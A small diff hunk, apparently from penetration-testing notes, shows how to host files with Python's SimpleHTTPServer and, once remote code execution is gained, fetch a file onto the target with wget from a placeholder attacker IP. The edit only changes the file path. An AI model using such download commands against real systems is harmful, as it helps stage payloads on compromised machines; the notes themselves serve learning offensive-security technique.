@@ -131,7 +131,7 @@ python -m SimpleHTTPServer
 and if we have code execution remotely, we can run something like
 
 ~~~
-wget $attacking_Machine_IP:port/direcory -O /remoteDirectory/placingThe/filHere
+wget $attacking_Machine_IP:port/direcory/.file -O /remoteDirectory/placingThe/filHere
 ~~~
 
 
